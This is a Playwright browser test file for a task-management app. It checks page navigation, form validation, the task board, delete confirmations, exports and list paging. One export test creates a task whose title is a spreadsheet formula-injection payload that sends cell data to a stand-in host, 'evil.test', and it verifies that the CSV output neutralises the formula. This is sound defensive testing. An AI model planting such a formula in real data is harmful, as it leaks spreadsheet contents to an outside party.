// Navigation, forms and validation, the board and list, filters, confirmations and exports, in a real browser.
import fs from 'node:fs'
import { ADMIN, api, expect, freshServer, SETUP_TOKEN, seedWorkspace, test, trackProblems } from './fixtures'

freshServer()

const PAGES: [nav: string, heading: string, hash: string][] = [
  ['Overview', 'Overview', '#/overview'],
  ['Projects', 'Projects', '#/projects'],
  ['My work', 'My work', '#/tasks'],
  ['People', 'People', '#/people'],
  ['Activity', 'Activity', '#/activity'],
  ['Reports', 'Reports', '#/reports'],
  ['Alerts', 'Alerts', '#/alerts'],
  ['Settings', 'Settings', '#/settings']
]

test.beforeEach(async ({ page, request }) => {
  // The first test of the file creates the workspace through the API (the wizard itself is covered in first-run-and-session).
  const status = await request.get('/api/setup/status')
  if (!(await status.json()).configured)
    expect(
      (await request.post('/api/setup', { data: { ...ADMIN, token: SETUP_TOKEN } })).status(),
      'setup through the API'
    ).toBe(200)
  const login = await page.request.post('/api/auth/login', { data: { email: ADMIN.email, password: ADMIN.password } })
  expect(login.status()).toBe(200)
})

const heading = (page: import('@playwright/test').Page, name: string) =>
  page.getByRole('heading', { level: 1, name, exact: true })

test('every page opens from the sidebar, keeps its URL, and Back, Forward and refresh work without a reload', async ({
  page
}) => {
  const problems = trackProblems(page)
  await page.goto('/')
  await expect(page.locator('.app-shell')).toBeVisible()
  await page.evaluate(() => ((window as any).__atlasMarker = 'same document')) // lost if the page ever really reloads

  for (const [nav, title, hash] of PAGES) {
    await page
      .getByRole('navigation', { name: 'Pages' })
      .getByRole('button', { name: new RegExp(`^${nav}`) })
      .click()
    await expect(heading(page, title)).toBeVisible()
    expect(new URL(page.url()).hash).toBe(hash)
  }
  expect(await page.evaluate(() => (window as any).__atlasMarker), 'navigation must not reload the document').toBe(
    'same document'
  )

  await page.goBack()
  await expect(heading(page, 'Alerts')).toBeVisible()
  await page.goBack()
  await expect(heading(page, 'Reports')).toBeVisible()
  await page.goForward()
  await expect(heading(page, 'Alerts')).toBeVisible()

  for (const [, title, hash] of PAGES) {
    await page.goto(`/${hash}`) // a deep link into the application
    await page.reload() // and a refresh on it
    await expect(heading(page, title)).toBeVisible()
  }
  await page.goto('/#/no-such-page')
  await expect(page.locator('.app-shell')).toBeVisible() // an unknown route falls back to a real page instead of a blank screen
  await expect(page.getByRole('heading', { level: 1 })).toBeVisible()
  problems.expectNone()
})

test('creating a project: required fields are enforced and a duplicate code is explained', async ({ page }) => {
  const problems = trackProblems(page)
  await page.goto('/#/projects')
  await page
    .getByRole('button', { name: /New project|Create project/ })
    .first()
    .click()
  const dialog = page.getByRole('dialog', { name: 'Create project' })
  await expect(dialog).toBeVisible()
  await dialog.getByRole('button', { name: 'Save' }).click()
  await expect(dialog).toBeVisible() // nothing is saved without a name
  // The browser's own validation stops the submit and announces why ("Please fill out this field").
  const name = dialog.getByLabel('Project name')
  expect(await name.evaluate(el => (el as HTMLInputElement).validity.valueMissing)).toBe(true)
  expect(await name.evaluate(el => (el as HTMLInputElement).validationMessage)).not.toBe('')

  await dialog.getByLabel('Project name').fill('Payments platform')
  await dialog.getByLabel('Code').fill('PAY')
  await dialog.getByRole('button', { name: 'Save' }).click()
  await expect(dialog).toBeHidden()
  await expect(page.getByText('Payments platform').first()).toBeVisible()

  await page
    .getByRole('button', { name: /New project|Create project/ })
    .first()
    .click()
  await dialog.getByLabel('Project name').fill('Another project')
  await dialog.getByLabel('Code').fill('PAY')
  await dialog.getByRole('button', { name: 'Save' }).click()
  await expect(dialog.locator('.form-error, [role="alert"]').first()).toContainText(/already used|already in use/i)
  // The form has been edited, so closing it asks before throwing the input away (browsers dismiss such prompts unless told).
  const prompted = new Promise<string>(resolve =>
    page.once('dialog', async prompt => {
      resolve(prompt.message())
      await prompt.accept()
    })
  )
  await dialog.getByRole('button', { name: 'Cancel' }).click()
  expect(await prompted).toMatch(/Discard your changes/i)
  await expect(dialog).toBeHidden()
  problems.allow(/40\d/) // the two deliberate rejections
  problems.expectNone()
})

test('tasks: add, find, move through the workflow, and edit', async ({ page }) => {
  const problems = trackProblems(page)
  await seedWorkspace(page, 6, { name: 'Tasks project', code: 'TSK', prefix: 'Alpha' })
  await page.goto('/#/tasks')
  await expect(heading(page, 'My work')).toBeVisible()
  const filter = page.getByPlaceholder('Filter tasks')
  await filter.fill('TSK-') // this test's project only
  await expect(page.locator('.board-card')).toHaveCount(6)

  await page
    .getByRole('button', { name: /Add task/ })
    .first()
    .click()
  const dialog = page.getByRole('dialog', { name: 'Create task' })
  await dialog.getByLabel('Task title').fill('Write the incident report')
  await dialog.getByLabel('Project').selectOption({ label: 'Tasks project' })
  await dialog.getByLabel('Due date').fill('2026-11-20')
  await dialog.getByRole('button', { name: 'Save' }).click()
  await expect(dialog).toBeHidden()
  await expect(page.locator('.board-card')).toHaveCount(7)

  await filter.fill('incident')
  await expect(page.locator('.board-card')).toHaveCount(1)
  await expect(page.locator('.results-meta')).toContainText(/Showing 1 of 1/)
  const card = page.locator('.board-card', { hasText: 'Write the incident report' })
  await card.locator('select').selectOption('In progress') // "Move to": the keyboard-reachable alternative to dragging
  await expect(
    page.locator('.board-column', { hasText: 'In progress' }).locator('.board-card', { hasText: 'incident' })
  ).toHaveCount(1)
  await filter.fill('TSK-')
  await expect(page.locator('.board-card')).toHaveCount(7)

  await page.getByRole('button', { name: 'Edit Write the incident report', exact: true }).click()
  const edit = page.getByRole('dialog')
  await expect(edit).toBeVisible()
  await edit.getByLabel('Task title').fill('Write the incident report (final)')
  await edit.getByRole('button', { name: 'Save' }).click()
  await expect(page.getByText('Write the incident report (final)').first()).toBeVisible()
  problems.expectNone()
})

test('deleting asks first, says what will be lost, and cancelling keeps everything', async ({ page }) => {
  const problems = trackProblems(page)
  const { project } = await seedWorkspace(page, 3, { name: 'Doomed project', code: 'DEL' })
  await page.goto('/#/projects')
  const messages: string[] = []
  let answer = false
  page.on('dialog', async dialog => {
    messages.push(dialog.message())
    if (answer) await dialog.accept()
    else await dialog.dismiss()
  })
  // open the project's edit dialog from its card menu
  await page.locator('.project-card', { hasText: 'Doomed project' }).getByRole('button', { name: 'Edit' }).click()
  const dialog = page.getByRole('dialog', { name: /Edit project|Project/ })
  await dialog.getByRole('button', { name: 'Delete' }).click()
  await expect.poll(() => messages.length).toBe(1)
  expect(messages[0]).toMatch(/Doomed project/)
  expect(messages[0]).toMatch(/\b3\b.*task/) // it names the tasks that would go with the project
  expect(messages[0]).toMatch(/cannot be undone/i)
  expect(
    (await api(page).get(`/api/bootstrap`)).body.projects.some((p: any) => p.numericId === project.numericId)
  ).toBe(true)

  answer = true
  await dialog.getByRole('button', { name: 'Delete' }).click()
  await expect
    .poll(async () => (await api(page).get('/api/bootstrap')).body.projects.some((p: any) => p.code === 'DEL'))
    .toBe(false)
  problems.expectNone()
})

test('exports produce real files in every format, and spreadsheets cannot be made to run formulas', async ({
  page
}) => {
  const problems = trackProblems(page)
  const { project, me } = await seedWorkspace(page, 8, { name: 'Export project', code: 'EXP' })
  await api(page).post('/api/tasks', {
    title: '=HYPERLINK("http://evil.test/?d="&A1,"Click")',
    projectId: project.numericId,
    assigneeId: me
  })
  await page.goto('/#/tasks')
  await expect(heading(page, 'My work')).toBeVisible()
  await page.getByPlaceholder('Filter tasks').fill('EXP-') // exports follow the filtered set: this test's 9 tasks
  await expect(page.locator('.results-meta')).toContainText(/Showing 9 of 9/)
  await page.locator('.export-wrap > button').click()
  const panel = page.locator('.export-panel')
  await expect(panel).toBeVisible()

  const download = async (format: string) => {
    await panel.locator('select').first().selectOption(format)
    const [file] = await Promise.all([
      page.waitForEvent('download'),
      panel.locator('.export-actions .secondary-button').first().click()
    ])
    const path = await file.path()
    return { name: file.suggestedFilename(), bytes: fs.readFileSync(path) }
  }

  const csv = await download('csv')
  expect(csv.name).toMatch(/\.csv$/)
  const text = csv.bytes.toString('utf8')
  expect(text.charCodeAt(0)).toBe(0xfeff) // a byte-order mark, so Excel reads non-Latin text correctly
  expect(text).toContain(`"'=HYPERLINK(`) // neutralised, not live
  expect(text).not.toMatch(/(^|,|\n)"=HYPERLINK/)
  expect(text.split('\r\n').filter(Boolean).length).toBe(1 + 9) // header + every task

  const json = JSON.parse((await download('json')).bytes.toString('utf8'))
  expect(json.document.title).toBe('Atlas tasks')
  expect(json.sections[0].rows).toHaveLength(9)
  expect(json.sections[0].columns.find((column: any) => column.key === 'dueDate').source).toBe('tasks.due_date') // names its database field

  const xlsx = await download('xlsx')
  expect(xlsx.bytes.subarray(0, 2).toString()).toBe('PK') // a zip container

  const pdf = await download('pdf') // the real jsPDF, with the fonts served by the real server
  expect(pdf.bytes.subarray(0, 5).toString()).toBe('%PDF-')
  expect(pdf.bytes.length).toBeGreaterThan(50_000) // the embedded Unicode font made it into the file (built on the server)
  problems.expectNone()
})

test('a long list is shown in windows with an honest count, and "Show more" reveals the rest', async ({ page }) => {
  const problems = trackProblems(page)
  const { project, me } = await seedWorkspace(page, 0, { name: 'Bulk project', code: 'BLK' })
  const client = api(page)
  for (let i = 1; i <= 70; i++)
    await client.post('/api/tasks', {
      title: `Bulk ${String(i).padStart(2, '0')}`,
      projectId: project.numericId,
      assigneeId: me
    })
  await page.goto('/#/tasks')
  await page.getByPlaceholder('Filter tasks').fill('BLK-')
  await page.getByRole('button', { name: /^List/ }).click()
  await expect(page.locator('.results-meta')).toContainText(/Showing 50 of 70/)
  await expect(page.locator('.task-row')).toHaveCount(50)
  await page.getByRole('button', { name: /Show .* more/ }).click()
  await expect(page.locator('.results-meta')).toContainText(/Showing 70 of 70/)
  await expect(page.locator('.task-row')).toHaveCount(70)
  problems.expectNone()
})
